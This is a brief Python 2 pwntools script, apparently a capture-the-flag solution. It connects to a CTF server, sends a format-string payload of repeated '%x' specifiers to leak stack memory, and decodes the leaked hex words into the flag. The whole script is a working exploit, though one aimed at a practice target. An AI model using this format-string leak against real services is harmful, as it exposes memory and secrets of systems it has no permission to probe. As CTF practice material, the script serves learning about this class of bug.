#!/usr/bin/env python

# imports
from pwn import remote

# connect to server
r = remote("ctf.yadunut.com",8007)
print r.recv()
print r.recv()
# send payload
r.sendline("%x " * 13)
response = r.recv()
print response
# parse response for pretty printing of flag
response = response.split(" ")
flag = []
for i in response:
    try:
        flag.append(i.decode("hex"))
    except:
        continue
print ''.join(flag[2:9])
